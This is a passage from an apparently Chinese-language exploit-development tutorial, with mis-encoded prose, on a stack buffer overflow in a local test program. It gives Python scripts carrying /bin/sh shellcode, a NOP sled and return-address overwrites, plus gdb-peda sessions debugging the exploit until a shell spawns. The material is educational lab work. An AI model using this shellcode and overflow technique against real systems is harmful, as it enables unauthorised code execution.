class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><br>shellcode = (<br><span class="hljs-string">b&#x27;\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2&#x27;</span> +<br><span class="hljs-string">b&#x27;\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89&#x27;</span> +<br><span class="hljs-string">b&#x27;\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&#x27;</span><br>)<br><br>nopsled = <span class="hljs-string">b&#x27;\x90&#x27;</span> * <span class="hljs-number">64</span><br>padding = <span class="hljs-string">b&#x27;A&#x27;</span> *(<span class="hljs-number">112</span> - <span class="hljs-number">64</span> - <span class="hljs-number">32</span>)<br>eip = <span class="hljs-string">b&#x27;\x30\xd0\xff\xff&#x27;</span><br><br>sys.stdout.buffer.write(nopsled + shellcode +padding +eip)<br></code></pre></td></tr></table></figure><h2 id="Testing-Exploit-2-in-gdb"><a href="#Testing-Exploit-2-in-gdb" class="headerlink" title="Testing Exploit 2 in gdb"></a>Testing Exploit 2 in gdb</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 b.py)</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> info registers</span><br>eax            0xffffd00c          0xffffd00c<br>ecx            0xffffd380          0xffffd380<br>edx            0xffffd073          0xffffd073<br>ebx            0x804c000           0x804c000<br>esp            0xffffd000          0xffffd000<br>ebp            0xffffd078          0xffffd078<br>esi            0x2                 0x2<br>edi            0x8049060           0x8049060<br>eip            0x80491ad           0x80491ad &lt;main+55&gt;<br>eflags         0x286               [ PF SF IF ]<br>cs             0x23                0x23<br>ss             0x2b                0x2b<br>ds             0x2b                0x2b<br>es             0x2b                0x2b<br>fs             0x0                 0x0<br>gs             0x63                0x63<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd000:     0x00000000      0x00000001      0xf7ffd9d0      0x90909090<br>0xffffd010:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd020:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd030:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd040:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd050:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd060:     0x52e38969      0x8de18953      0x80cd0b42      0x41414141<br>0xffffd070:     0x41414141      0x41414141      0x41414141      0xffffd030<br>0xffffd080:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd090:     0x00000002      0xffffd134      0xffffd140      0xffffd0c4<br></code></pre></td></tr></table></figure><p>ç»§ç»­è¿è¡Œï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> c</span><br>Continuing.<br>Done!<br><br>Program received signal SIGSEGV, Segmentation fault.<br>[----------------------------------registers-----------------------------------]<br>EAX: 0x6 <br>EBX: 0x41414141 (&#x27;AAAA&#x27;)<br>ECX: 0x41414141 (&#x27;AAAA&#x27;)<br>EDX: 0xffffffff <br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0x41414141 (&#x27;AAAA&#x27;)<br>ESP: 0x4141413d (&#x27;=AAA&#x27;)<br>EIP: 0x80491c9 (&lt;main+83&gt;:      ret)<br>EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491c4 &lt;main+78&gt;: pop    ebx<br>   0x80491c5 &lt;main+79&gt;: pop    ebp<br>   0x80491c6 &lt;main+80&gt;: lea    esp,[ecx-0x4]<br>=&gt; 0x80491c9 &lt;main+83&gt;: ret    <br>   0x80491ca:   xchg   ax,ax<br>   0x80491cc:   xchg   ax,ax<br>   0x80491ce:   xchg   ax,ax<br>   0x80491d0 &lt;__libc_csu_init&gt;: push   ebp<br>[------------------------------------stack-------------------------------------]<br>Invalid $SP address: 0x4141413d<br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>Stopped reason: SIGSEGV<br>0x080491c9 in main (argc=&lt;error reading variable: Cannot access memory at address 0x41414141&gt;, <br>    argv=&lt;error reading variable: Cannot access memory at address 0x41414145&gt;) at bol.c:7<br>7       &#125;<br></code></pre></td></tr></table></figure><p>å®ƒå°†åœæ­¢çš„åŸå› æ˜¾ç¤ºä¸º SIGSEGVã€‚è¿™æ„å‘³ç€å‘ç”Ÿäº†åˆ†æ®µè¿è§„ä¿¡å·ï¼Œç¨‹åºå·²åœæ­¢ã€‚SIGSEGVé€šå¸¸ç§°ä¸ºåˆ†æ®µæ•…éšœã€‚</p><p>åº”è¯¥è°ƒç”¨ä¸€ä¸ª â€œ/bin/dashâ€ ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ï¼Œé‡æ–°è°ƒè¯•å¹¶ä¸€æ­¥ä¸€æ­¥æŸ¥çœ‹æ±‡ç¼–ä»£ç å’Œè¿è¡Œæƒ…å†µã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 b.py)</span><br>Starting program: /home/kali/StackOverflowtest/bol $(python3 b.py)<br>[----------------------------------registers-----------------------------------]<br>EAX: 0xffffd00c --&gt; 0x90909090 <br>EBX: 0x804c000 --&gt; 0x804bf14 --&gt; 0x1 <br>ECX: 0xffffd380 (&quot;AAAAAAAAA0\320\377\377&quot;)<br>EDX: 0xffffd073 (&quot;AAAAAAAAA0\320\377\377&quot;)<br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0xffffd078 (&quot;AAAA0\320\377\377&quot;)<br>ESP: 0xffffd000 --&gt; 0x0 <br>EIP: 0x80491ad (&lt;main+55&gt;:      sub    esp,0xc)<br>EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491a4 &lt;main+46&gt;: push   eax<br>   0x80491a5 &lt;main+47&gt;: call   0x8049030 &lt;strcpy@plt&gt;<br>   0x80491aa &lt;main+52&gt;: add    esp,0x10<br>=&gt; 0x80491ad &lt;main+55&gt;: sub    esp,0xc<br>   0x80491b0 &lt;main+58&gt;: lea    eax,[ebx-0x1ff8]<br>   0x80491b6 &lt;main+64&gt;: push   eax<br>   0x80491b7 &lt;main+65&gt;: call   0x8049040 &lt;puts@plt&gt;<br>   0x80491bc &lt;main+70&gt;: add    esp,0x10<br>[------------------------------------stack-------------------------------------]<br>0000| 0xffffd000 --&gt; 0x0 <br>0004| 0xffffd004 --&gt; 0x1 <br>0008| 0xffffd008 --&gt; 0xf7ffd9d0 --&gt; 0x0 <br>0012| 0xffffd00c --&gt; 0x90909090 <br>0016| 0xffffd010 --&gt; 0x90909090 <br>0020| 0xffffd014 --&gt; 0x90909090 <br>0024| 0xffffd018 --&gt; 0x90909090 <br>0028| 0xffffd01c --&gt; 0x90909090 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br><br>Breakpoint 1, main (argc=&lt;error reading variable: Cannot access memory at address 0x41414141&gt;, <br>    argv=&lt;error reading variable: Cannot access memory at address 0x41414145&gt;) at bol.c:6<br>6           printf(&quot;Done!\n&quot;);<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> n</span><br>Done!<br>[----------------------------------registers-----------------------------------]<br>EAX: 0x6 <br>EBX: 0x804c000 --&gt; 0x804bf14 --&gt; 0x1 <br>ECX: 0xffffffff <br>EDX: 0xffffffff <br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0xffffd078 (&quot;AAAA0\320\377\377&quot;)<br>ESP: 0xffffd000 --&gt; 0x0 <br>EIP: 0x80491bf (&lt;main+73&gt;:      nop)<br>EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491b6 &lt;main+64&gt;: push   eax<br>   0x80491b7 &lt;main+65&gt;: call   0x8049040 &lt;puts@plt&gt;<br>   0x80491bc &lt;main+70&gt;: add    esp,0x10<br>=&gt; 0x80491bf &lt;main+73&gt;: nop<br>   0x80491c0 &lt;main+74&gt;: lea    esp,[ebp-0x8]<br>   0x80491c3 &lt;main+77&gt;: pop    ecx<br>   0x80491c4 &lt;main+78&gt;: pop    ebx<br>   0x80491c5 &lt;main+79&gt;: pop    ebp<br>[------------------------------------stack-------------------------------------]<br>0000| 0xffffd000 --&gt; 0x0 <br>0004| 0xffffd004 --&gt; 0x1 <br>0008| 0xffffd008 --&gt; 0xf7ffd9d0 --&gt; 0x0 <br>0012| 0xffffd00c --&gt; 0x90909090 <br>0016| 0xffffd010 --&gt; 0x90909090 <br>0020| 0xffffd014 --&gt; 0x90909090 <br>0024| 0xffffd018 --&gt; 0x90909090 <br>0028| 0xffffd01c --&gt; 0x90909090 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>7       &#125;<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> n</span><br><br>Program received signal SIGSEGV, Segmentation fault.<br>[----------------------------------registers-----------------------------------]<br>EAX: 0x6 <br>EBX: 0x41414141 (&#x27;AAAA&#x27;)<br>ECX: 0x41414141 (&#x27;AAAA&#x27;)<br>EDX: 0xffffffff <br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0x41414141 (&#x27;AAAA&#x27;)<br>ESP: 0x4141413d (&#x27;=AAA&#x27;)<br>EIP: 0x80491c9 (&lt;main+83&gt;:      ret)<br>EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491c4 &lt;main+78&gt;: pop    ebx<br>   0x80491c5 &lt;main+79&gt;: pop    ebp<br>   0x80491c6 &lt;main+80&gt;: lea    esp,[ecx-0x4]<br>=&gt; 0x80491c9 &lt;main+83&gt;: ret    <br>   0x80491ca:   xchg   ax,ax<br>   0x80491cc:   xchg   ax,ax<br>   0x80491ce:   xchg   ax,ax<br>   0x80491d0 &lt;__libc_csu_init&gt;: push   ebp<br>[------------------------------------stack-------------------------------------]<br>Invalid $SP address: 0x4141413d<br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br>Stopped reason: SIGSEGV<br>0x080491c9 in main (argc=&lt;error reading variable: Cannot access memory at address 0x41414141&gt;, <br>    argv=&lt;error reading variable: Cannot access memory at address 0x41414145&gt;) at bol.c:7<br>7       &#125;<br></code></pre></td></tr></table></figure><p>åæ±‡ç¼–ï¼š</p><p><a href="https://blog.csdn.net/rznice/article/details/82052815/">GDB disassemble_rzniceçš„åšå®¢-CSDNåšå®¢_gdbä¸­disassemble</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> disassemble <span class="hljs-variable">$pc</span></span><br>Dump of assembler code for function main:<br>   0x08049176 &lt;+0&gt;:     lea    ecx,[esp+0x4]<br>   0x0804917a &lt;+4&gt;:     and    esp,0xfffffff0<br>   0x0804917d &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]<br>   0x08049180 &lt;+10&gt;:    push   ebp<br>   0x08049181 &lt;+11&gt;:    mov    ebp,esp<br>   0x08049183 &lt;+13&gt;:    push   ebx<br>   0x08049184 &lt;+14&gt;:    push   ecx<br>   0x08049185 &lt;+15&gt;:    sub    esp,0x70<br>   0x08049188 &lt;+18&gt;:    call   0x80490b0 &lt;__x86.get_pc_thunk.bx&gt;<br>   0x0804918d &lt;+23&gt;:    add    ebx,0x2e73<br>   0x08049193 &lt;+29&gt;:    mov    eax,ecx<br>   0x08049195 &lt;+31&gt;:    mov    eax,DWORD PTR [eax+0x4]<br>   0x08049198 &lt;+34&gt;:    add    eax,0x4<br>   0x0804919b &lt;+37&gt;:    mov    eax,DWORD PTR [eax]<br>   0x0804919d &lt;+39&gt;:    sub    esp,0x8<br>   0x080491a0 &lt;+42&gt;:    push   eax<br>   0x080491a1 &lt;+43&gt;:    lea    eax,[ebp-0x6c]<br>   0x080491a4 &lt;+46&gt;:    push   eax<br>   0x080491a5 &lt;+47&gt;:    call   0x8049030 &lt;strcpy@plt&gt;<br>   0x080491aa &lt;+52&gt;:    add    esp,0x10<br>   0x080491ad &lt;+55&gt;:    sub    esp,0xc<br>   0x080491b0 &lt;+58&gt;:    lea    eax,[ebx-0x1ff8]<br>   0x080491b6 &lt;+64&gt;:    push   eax<br>   0x080491b7 &lt;+65&gt;:    call   0x8049040 &lt;puts@plt&gt;<br>   0x080491bc &lt;+70&gt;:    add    esp,0x10<br>   0x080491bf &lt;+73&gt;:    nop<br>   0x080491c0 &lt;+74&gt;:    lea    esp,[ebp-0x8]<br>   0x080491c3 &lt;+77&gt;:    pop    ecx<br>   0x080491c4 &lt;+78&gt;:    pop    ebx<br>   0x080491c5 &lt;+79&gt;:    pop    ebp<br>   0x080491c6 &lt;+80&gt;:    lea    esp,[ecx-0x4]<br>=&gt; 0x080491c9 &lt;+83&gt;:    ret    <br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>é€šè¿‡æŸ¥çœ‹æ±‡ç¼–ä»£ç ï¼Œå‘ç°ç¨‹åºåœ¨è¿è¡Œå®Œputsåä¸æ˜¯leave;retï¼Œè€Œæ˜¯åˆè¿è¡Œäº†äº”å¥ä»£ç ï¼Œä¹Ÿå°±æ˜¯è¿™äº›ä»£ç ä½¿æŒ‡é’ˆespå‘ç”Ÿå˜åŒ–ï¼Œè¿”å›åœ°å€ä¹Ÿç›¸åº”åœ°å‘ç”Ÿäº†å˜åŒ–ã€‚</p><p>åˆ†æå¾—çŸ¥ï¼Œ[ebp-8]-4æ‰æ˜¯è¿”å›åœ°å€ï¼Œé‡æ–°æ„é€ æ•°æ®ï¼š</p><p><strong>c.pyï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/usr/bin/python3</span><br>import sys<br><br>shellcode = (<br>b&#x27;\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2&#x27; +<br>b&#x27;\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89&#x27; +<br>b&#x27;\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&#x27;<br>)<br><br>nopsled = b&#x27;\x90&#x27; * 64<br>padding = b&#x27;A&#x27; *(112 - 64 - 32-12)<br>eip = b&#x27;\x80\xd0\xff\xff\x80\xd0\xff\xff\x80\xd0\xff\xff\x30\xd0\xff\xff&#x27;<br><br>sys.stdout.buffer.write(nopsled + shellcode +padding +eip)<br></code></pre></td></tr></table></figure><h2 id="Testing-Exploit-3-in-gdb"><a href="#Testing-Exploit-3-in-gdb" class="headerlink" title="Testing Exploit 3 in gdb"></a>Testing Exploit 3 in gdb</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 c.py)</span><br>Starting program: /home/kali/StackOverflowtest/bol $(python3 c.py)<br>[----------------------------------registers-----------------------------------]<br>EAX: 0xffffd00c --&gt; 0x90909090 <br>EBX: 0x804c000 --&gt; 0x804bf14 --&gt; 0x1 <br>ECX: 0xffffd380 --&gt; 0xffd080ff <br>EDX: 0xffffd073 --&gt; 0xffd080ff <br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0xffffd078 --&gt; 0xffffd080 --&gt; 0x0 <br>ESP: 0xffffd000 --&gt; 0x0 <br>EIP: 0x80491ad (&lt;main+55&gt;:      sub    esp,0xc)<br>EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491a4 &lt;main+46&gt;: push   eax<br>   0x80491a5 &lt;main+47&gt;: call   0x8049030 &lt;strcpy@plt&gt;<br>   0x80491aa &lt;main+52&gt;: add    esp,0x10<br>=&gt; 0x80491ad &lt;main+55&gt;: sub    esp,0xc<br>   0x80491b0 &lt;main+58&gt;: lea    eax,[ebx-0x1ff8]<br>   0x80491b6 &lt;main+64&gt;: push   eax<br>   0x80491b7 &lt;main+65&gt;: call   0x8049040 &lt;puts@plt&gt;<br>   0x80491bc &lt;main+70&gt;: add    esp,0x10<br>[------------------------------------stack-------------------------------------]<br>0000| 0xffffd000 --&gt; 0x0 <br>0004| 0xffffd004 --&gt; 0x1 <br>0008| 0xffffd008 --&gt; 0xf7ffd9d0 --&gt; 0x0 <br>0012| 0xffffd00c --&gt; 0x90909090 <br>0016| 0xffffd010 --&gt; 0x90909090 <br>0020| 0xffffd014 --&gt; 0x90909090 <br>0024| 0xffffd018 --&gt; 0x90909090 <br>0028| 0xffffd01c --&gt; 0x90909090 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br><br>Breakpoint 1, main (argc=0x0, argv=0x8049060 &lt;_start&gt;) at bol.c:6<br>6           printf(&quot;Done!\n&quot;);<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd000:     0x00000000      0x00000001      0xf7ffd9d0      0x90909090<br>0xffffd010:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd020:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd030:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd040:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd050:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd060:     0x52e38969      0x8de18953      0x80cd0b42      0x41414141<br>0xffffd070:     0xffffd080      0xffffd080      0xffffd080      0xffffd030<br>0xffffd080:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd090:     0x00000002      0xffffd134      0xffffd140      0xffffd0c4<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> c</span><br>Continuing.<br>Done!<br>process 8946 is executing new program: /usr/bin/dash<br>Error in re-setting breakpoint 1: No source file named /home/kali/StackOverflowtest/bol.c.<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>[Attaching after process 8946 vfork to child process 8951]<br>[New inferior 2 (process 8951)]<br>[Detaching vfork parent process 8946 after child exec]<br>[Inferior 1 (process 8946) detached]<br>process 8951 is executing new program: /usr/bin/id<br>[Thread debugging using libthread_db enabled]<br>Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.<br>uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),120(wireshark),134(scanner),142(kaboxer)<br><span class="hljs-meta">$</span><span class="bash"> [Inferior 2 (process 8951) exited normally]</span><br>Warning: not running<br>zsh: suspended (tty output)  gdb -q bol<br>                                                                                                                 <br>â”Œâ”€â”€(kaliã‰¿kali)-[~/StackOverflowtest]<br>â””â”€$<br></code></pre></td></tr></table></figure><p>æˆåŠŸå¾—åˆ°ä¸€ä¸ª shellï¼Œä¸”å¾—åˆ°äº† idï¼Œä½†é€€å‡ºäº†ï¼Œåº”è¯¥æ˜¯ peda çš„é—®é¢˜ï¼ˆå› ä¸ºç”¨è¿‡ä¸€æ¬¡æ²¡æœ‰ peda çš„ gdbï¼Œè®°å¾—æ˜¯æ²¡æœ‰é€€å‡ºï¼‰</p><h2 id="Testing-Exploit-3-in-the-Normal-Shell"><a href="#Testing-Exploit-3-in-the-Normal-Shell" class="headerlink" title="Testing Exploit 3 in the Normal Shell"></a>Testing Exploit 3 in the Normal Shell</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./bol $(python3 c.py)</span><br>Done!<br>zsh: segmentation fault  ./bol $(python3 c.py)<br></code></pre></td></tr></table></figure><p>çœ‹æ¥é€‰æ‹©çš„ Nop ä½ç½®ä¸è¡Œï¼Œå¯ä»¥å°è¯•æ¢ä½ç½®ç›´åˆ°å¯ä»¥åˆ©ç”¨ã€‚è¿™é‡Œæˆ‘é€‰æ‹©åˆ é™¤ gdb ç¯å¢ƒå˜é‡è¿›è¡Œå°è¯•ã€‚</p><blockquote><p>äº‹å®è¯æ˜ï¼Œgdb ç¯å¢ƒå’Œåº”ç”¨ç¨‹åºè¿è¡Œçš„å®é™…ç¯å¢ƒç•¥æœ‰ä¸åŒã€‚gdb å°†è®¾ç½®ä¸€äº›ç§°ä¸º LINES å’Œ COLUMNS çš„ç¯å¢ƒå˜é‡ï¼Œä»¥æ­£ç¡®æ˜¾ç¤ºç»ˆç«¯ä¸Šçš„è¾“å‡ºã€‚ è¿™å¯¹äºæ•´æ´æ¼‚äº®çš„è¾“å‡ºéå¸¸æœ‰ç”¨ï¼Œä½†å¯¹äºç¯å¢ƒå¯¹æ›´æ”¹è¿‡äºæ•æ„Ÿçš„æ¼æ´åˆ©ç”¨å¼€å‘åˆ™ä¸åˆ©ã€‚</p></blockquote><p>åˆ é™¤LINESå’ŒCOLUMNSå˜é‡ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> show environment</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> <span class="hljs-built_in">unset</span> environment LINES</span> <br><span class="hljs-meta">gdb-peda$</span><span class="bash"> <span class="hljs-built_in">unset</span> environment COLUMNS</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨ show environment å‘½ä»¤æ£€æŸ¥å˜é‡æ˜¯å¦æœªè®¾ç½®ã€‚</p><p>é‡æ–°è¿è¡Œè°ƒè¯•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 